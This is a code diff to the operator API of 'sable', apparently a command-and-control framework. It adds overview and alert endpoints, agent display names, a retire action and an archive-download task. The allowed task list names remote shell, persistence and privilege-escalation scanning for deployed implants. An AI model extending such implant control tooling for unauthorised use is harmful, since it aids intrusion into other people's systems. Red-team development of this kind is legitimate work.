@@ -10,6 +10,8 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"unicode"
+	"unicode/utf8"
 
 	"github.com/aelder202/sable/internal/protocol"
 	"github.com/aelder202/sable/internal/session"
@@ -18,7 +20,10 @@ import (
 
 // agentIDRe restricts agent IDs to URL-safe alphanumeric+hyphen strings to prevent
 // path traversal, header injection, and other misuse when IDs appear in URLs.
-var agentIDRe = regexp.MustCompile(`^[a-zA-Z0-9\-]{1,64}$`)
+var (
+	agentIDRe         = regexp.MustCompile(`^[a-zA-Z0-9\-]{1,64}$`)
+	overviewAlertIDRe = regexp.MustCompile(`^[a-f0-9]{32}$`)
+)
 
 // Config holds operator API configuration.
 type Config struct {
@@ -28,7 +33,7 @@ type Config struct {
 }
 
 const (
-	maxRegisterBodyBytes   = 1024
+	maxRegisterBodyBytes   = 2048
 	maxTaskBodyBytes       = maxUploadTaskPayloadBytes + 1024
 	maxArtifactBodyBytes   = 75 * 1024 * 1024
 	maxDNSTaskPayloadBytes = 8 * 1024
@@ -50,6 +55,8 @@ func NewRouter(store *session.Store, cfg *Config) *Router {
 	mux.HandleFunc("/api/auth/login", limitLogin(rl, loginHandler(cfg)))
 	mux.Handle("/api/admin/shutdown", auth(http.HandlerFunc(shutdownHandler(cfg))))
 	mux.Handle("/api/audit", auth(http.HandlerFunc(auditHandler(store))))
+	mux.Handle("/api/overview", auth(http.HandlerFunc(overviewHandler(store))))
+	mux.Handle("/api/overview/alerts/", auth(http.HandlerFunc(overviewAlertHandler(store))))
 	mux.Handle("/api/agents", auth(http.HandlerFunc(agentsCollectionHandler(store))))
 	mux.Handle("/api/agents/", auth(http.HandlerFunc(agentRouter(store))))
 
@@ -95,13 +102,56 @@ func agentsCollectionHandler(store *session.Store) http.HandlerFunc {
 	}
 }
 
+func overviewHandler(store *session.Store) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodGet {
+			w.Header().Set("Allow", http.MethodGet)
+			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(store.Overview()) //nolint:errcheck
+	}
+}
+
+func overviewAlertHandler(store *session.Store) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPut {
+			w.Header().Set("Allow", http.MethodPut)
+			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		alertID := strings.TrimPrefix(r.URL.Path, "/api/overview/alerts/")
+		if !overviewAlertIDRe.MatchString(alertID) {
+			http.Error(w, "invalid overview alert id", http.StatusBadRequest)
+			return
+		}
+		var req struct {
+			Disposition string `json:"disposition"`
+		}
+		if !decodeJSONBody(w, r, &req, 1024) {
+			return
+		}
+		if req.Disposition != "acknowledged" {
+			http.Error(w, "disposition must be acknowledged", http.StatusBadRequest)
+			return
+		}
+		if !store.ResolveFailureAlert(alertID, req.Disposition) {
+			http.Error(w, "overview alert not found", http.StatusNotFound)
+			return
+		}
+		w.WriteHeader(http.StatusNoContent)
+	}
+}
+
 // registerAgentHandler pre-registers an agent session so it can begin beaconing.
 // The operator must call this before deploying an implant built with the same
-// agent ID and secret. Request body: {"id": "<uuid>", "secret_hex": "<64-hex-chars>"}.
+// agent ID and secret. An optional display_name seeds the operator-facing name.
 func registerAgentHandler(store *session.Store, w http.ResponseWriter, r *http.Request) {
 	var req struct {
-		ID        string `json:"id"`
-		SecretHex string `json:"secret_hex"`
+		ID          string `json:"id"`
+		SecretHex   string `json:"secret_hex"`
+		DisplayName string `json:"display_name"`
 	}
 	if !decodeJSONBody(w, r, &req, maxRegisterBodyBytes) {
 		return
@@ -119,9 +169,15 @@ func registerAgentHandler(store *session.Store, w http.ResponseWriter, r *http.R
 		http.Error(w, "secret_hex must be 64 hex characters (32 bytes)", http.StatusBadRequest)
 		return
 	}
+	displayName, err := validateDisplayName(req.DisplayName)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		return
+	}
 	store.Register(&session.Agent{
-		ID:     req.ID,
-		Secret: secret,
+		ID:          req.ID,
+		Secret:      secret,
+		DisplayName: displayName,
 	})
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(http.StatusCreated)
@@ -177,6 +233,8 @@ func agentRouter(store *session.Store) http.HandlerFunc {
 			getQueuedTasksHandler(store, agentID)(w, r)
 		case "metadata":
 			updateAgentMetadataHandler(store, agentID)(w, r)
+		case "lifecycle":
+			updateAgentLifecycleHandler(store, agentID)(w, r)
 		case "rekey":
 			rekeyAgentHandler(store, agentID)(w, r)
 		case "artifacts":
@@ -219,7 +277,7 @@ func queueTaskHandler(store *session.Store, agentID string) http.HandlerFunc {
 			return
 		}
 		allowed := map[string]bool{
-			"shell": true, "upload": true, "download": true,
+			"shell": true, "upload": true, "download": true, "download_archive": true,
 			"sleep": true, "kill": true, "interactive": true,
 			"complete": true, "pathbrowse": true,
 			"ps": true, "screenshot": true, "persistence": true, "peas": true,
@@ -243,7 +301,14 @@ func queueTaskHandler(store *session.Store, agentID string) http.HandlerFunc {
 			Payload: normalizeTaskPayload(req.Type, req.Payload),
 		}
 		if err := store.EnqueueTask(agentID, task); err != nil {
-			http.Error(w, err.Error(), http.StatusTooManyRequests)
+			status := http.StatusTooManyRequests
+			switch {
+			case errors.Is(err, session.ErrAgentNotFound):
+				status = http.StatusNotFound
+			case errors.Is(err, session.ErrAgentRetired):
+				status = http.StatusConflict
+			}
+			http.Error(w, err.Error(), status)
 			return
 		}
 		w.Header().Set("Content-Type", "application/json")
@@ -326,8 +391,9 @@ func updateAgentMetadataHandler(store *session.Store, agentID string) http.Handl
 			return
 		}
 		var req struct {
-			Notes string   `json:"notes"`
-			Tags  []string `json:"tags"`
+			DisplayName string   `json:"display_name"`
+			Notes       string   `json:"notes"`
+			Tags        []string `json:"tags"`
 		}
 		if !decodeJSONBody(w, r, &req, maxTaskBodyBytes) {
 			return
@@ -336,7 +402,12 @@ func updateAgentMetadataHandler(store *session.Store, agentID string) http.Handl
 			http.Error(w, "metadata too large", http.StatusBadRequest)
 			return
 		}
-		agent, ok := store.UpdateMetadata(agentID, req.Notes, req.Tags)
+		displayName, err := validateDisplayName(req.DisplayName)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		agent, ok := store.UpdateMetadataWithName(agentID, displayName, req.Notes, req.Tags)
 		if !ok {
 			http.NotFound(w, r)
 			return
@@ -344,6 +415,41 @@ func updateAgentMetadataHandler(store *session.Store, agentID string) http.Handl
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(agent) //nolint:errcheck
 	}
+}
+
+func updateAgentLifecycleHandler(store *session.Store, agentID string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPut {
+			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		var req struct {
+			Retired bool `json:"retired"`
+		}
+		if !decodeJSONBody(w, r, &req, 1024) {
+			return
+		}
+		agent, ok := store.SetRetired(agentID, req.Retired)
+		if !ok {
+			http.NotFound(w, r)
+			return
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(agent) //nolint:errcheck
+	}
+}
+
+func validateDisplayName(value string) (string, error) {
+	value = strings.TrimSpace(value)
+	if !utf8.ValidString(value) || utf8.RuneCountInString(value) > 64 {
+		return "", errors.New("display name must be at most 64 valid Unicode characters")
+	}
+	for _, r := range value {
+		if unicode.IsControl(r) {
+			return "", errors.New("display name contains invalid control characters")
+		}
+	}
+	return value, nil
 }
 
 func artifactsHandler(store *session.Store, agentID string) http.HandlerFunc {
